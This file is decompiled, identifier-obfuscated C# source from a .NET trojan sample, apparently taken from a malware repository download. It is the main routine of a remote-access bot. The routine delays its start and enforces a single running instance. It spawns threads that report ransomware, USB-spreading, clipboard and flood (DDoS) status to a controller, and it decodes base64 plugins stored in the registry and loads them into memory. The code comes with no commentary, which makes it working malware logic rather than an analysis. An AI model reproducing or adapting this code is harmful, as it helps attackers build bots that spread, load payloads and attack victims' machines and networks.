// Decompiled with JetBrains decompiler
// Type: 希顧的孫首承敬希.的受顧太玉太
// Assembly: 金是人望承子的的是公公的金司的程尊承顧, Version=1.8.7.7, Culture=neutral, PublicKeyToken=null
// MVID: E30F5A4F-F1E8-458D-9542-0A3A79B19682
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-21b86512de83574c3ad44210d025e93fb28d205cfbd18825da0a64a52063b627.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using 城首太接受顧引顧;
using 家執是成程尊首席受的生顧引生;
using 成官執望是導;
using 成為的合接城接人管;
using 法顧接生的澤官她的人的的望接;
using 的法公管的澤尊;
using 的澤席命希太將她的金命官;
using 的的執尊承使望顧太澤將引;
using 程成澤的家澤法太望的金;
using 金使孫人尊導成繼的金;
using 金席行商她;

namespace 希顧的孫首承敬希
{
  public class 的受顧太玉太
  {
    public static object 首的希子的的生人人 = (object) 管導行官玉.她尊玉司合命希的顧法人;

    [STAThread]
    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void 商澤的首澤她尊()
    {
      try
      {
        int 太尊的命商人官澤為行城席生 = 管導行官玉.太尊的命商人官澤為行城席生;
        while (太尊的命商人官澤為行城席生 != 0)
        {
          Thread.Sleep(1000);
          checked { --太尊的命商人官澤為行城席生; }
        }
        bool createdNew = false;
        管導行官玉.受成望子程行成顧執導尊 = new Mutex(true, 的公的人官導官太命程.將太將金法司子的(), out createdNew);
        if (!createdNew)
          ProjectData.EndApp();
        if (管導行官玉.官的首金公成顧人尊接受子顧)
          太的玉望玉澤望.太的太孫管商導的孫();
        顧執是官的導澤家顧司顧商繼.將孫公程人顧公澤行的人她法();
        人司的敬是將生執顧.引受程成行執導玉.Start();
        if (管導行官玉.為程金金公執合引司敬人引行)
          new Thread(new ThreadStart(的受顧太玉太.繼澤商成望)).Start();
        if (管導行官玉.顧望人城顧人顧的命受太敬)
          new Thread(new ThreadStart(的受顧太玉太.敬的接司程城成公承孫的管使望)).Start();
        new Thread(new ThreadStart(的受顧太玉太.人程人司尊顧導顧玉澤成金的的)).Start();
        new Thread(new ThreadStart(金城的澤繼.人成為望公成人管)).Start();
        if (管導行官玉.執使管尊導的受孫商公金的繼將.Length > 25)
        {
          Thread thread = new Thread(new ThreadStart(商的將太顧成的官.澤澤澤的金接的澤的的管法敬));
          thread.SetApartmentState(ApartmentState.STA);
          thread.Start();
        }
        為程席顧接希顧繼商生.人行生受成管();
        SystemEvents.SessionEnding += new SessionEndingEventHandler(命澤成的敬太.的的顧導程尊法生的顧引成顧);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("coredll.dll", EntryPoint = "SystemIdleTimerReset", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern void 希子承的管太人();

    private static void 人程人司尊顧導顧玉澤成金的的()
    {
      Thread.Sleep(5000);
      string str1 = Conversions.ToString(的公的人官導官太命程.孫是望承太城司家());
      string str2 = Conversions.ToString(的公的人官導官太命程.命玉席受人顧城顧家());
      string str3 = "...";
      string str4 = Conversions.ToString(的公的人官導官太命程.程商的子子敬顧());
      int num1 = (int) 顧澤的的顧的成子顧家受受.的合首金人顧澤();
      while (true)
      {
        int num2 = 1;
        if (人司的敬是將生執顧.金席人合太太家接合希商合)
        {
          Thread.Sleep(3000);
          try
          {
            if (Operators.CompareString(str1, 命澤成的敬太.導子金人承導敬人行席望人("Rans-Status"), false) != 0)
            {
              str1 = 命澤成的敬太.導子金人承導敬人行席望人("Rans-Status");
              人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "!R", 的受顧太玉太.首的希子的的生人人), (object) str1)));
            }
          }
          catch (Exception ex)
          {
            int lErl = num2;
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
          }
          try
          {
            if (管導行官玉.為程金金公執合引司敬人引行)
            {
              if (Operators.CompareString(str2, 命澤成的敬太.導子金人承導敬人行席望人("USB").ToString(), false) != 0)
              {
                str2 = 命澤成的敬太.導子金人承導敬人行席望人("USB");
                人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "!SP", 的受顧太玉太.首的希子的的生人人), (object) str2)));
              }
            }
          }
          catch (Exception ex)
          {
            int lErl = num2;
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
          }
          try
          {
            if (Operators.CompareString(str3, 的公的人官導官太命程.公為人管尊首導商引(), false) != 0)
            {
              str3 = 的公的人官導官太命程.公為人管尊首導商引();
              人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "!X", 的受顧太玉太.首的希子的的生人人), (object) str3)));
            }
          }
          catch (Exception ex)
          {
            int lErl = num2;
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
          }
          try
          {
            if (Operators.CompareString(str4, 命澤成的敬太.導子金人承導敬人行席望人("Flood").ToString(), false) != 0)
            {
              str4 = 命澤成的敬太.導子金人承導敬人行席望人("Flood");
              人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object) "MSG", 的受顧太玉太.首的希子的的生人人), (object) "Flood! "), (object) str4)));
              str4 = "";
              命澤成的敬太.程金的希尊顧的行顧席司玉家("Flood", "");
            }
          }
          catch (Exception ex)
          {
            int lErl = num2;
            ProjectData.SetProjectError(ex, lErl);
            ProjectData.ClearProjectError();
          }
        }
        else
          Thread.Sleep(5000);
      }
    }

    private static void 繼澤商成望()
    {
      try
      {
        if (Operators.CompareString(命澤成的敬太.導子金人承導敬人行席望人("_USB"), (string) null, false) == 0)
        {
          while (!人司的敬是將生執顧.金席人合太太家接合希商合)
            Thread.Sleep(5000);
          Thread.Sleep(9000);
          人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席("PLUSB");
        }
        else
        {
          byte[] 商子的官是公承顧 = Convert.FromBase64String(命澤成的敬太.導子金人承導敬人行席望人("_USB"));
          bool flag = false;
          ref bool local = ref flag;
          首成將人的法受合的望的.太的法顧命(命澤成的敬太.是望的澤太承太商她孫(商子的官是公承顧, ref local));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "MSG", 的受顧太玉太.首的希子的的生人人), (object) "_USB Error! "), (object) exception.Message)));
        ProjectData.ClearProjectError();
      }
    }

    private static void 敬的接司程城成公承孫的管使望()
    {
      try
      {
        if (Operators.CompareString(命澤成的敬太.導子金人承導敬人行席望人("_PIN"), (string) null, false) == 0)
        {
          while (!人司的敬是將生執顧.金席人合太太家接合希商合)
            Thread.Sleep(5000);
          Thread.Sleep(11000);
          人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席("PLPIN");
        }
        else
        {
          byte[] 商子的官是公承顧 = Convert.FromBase64String(命澤成的敬太.導子金人承導敬人行席望人("_PIN"));
          bool flag = false;
          ref bool local = ref flag;
          首成將人的法受合的望的.太的法顧命(命澤成的敬太.是望的澤太承太商她孫(商子的官是公承顧, ref local));
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
        人司的敬是將生執顧.孫人顧導程受的生澤顧她首商席(Conversions.ToString(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "MSG", 的受顧太玉太.首的希子的的生人人), (object) "_PIN Error! "), (object) exception.Message)));
        ProjectData.ClearProjectError();
      }
    }
  }
}
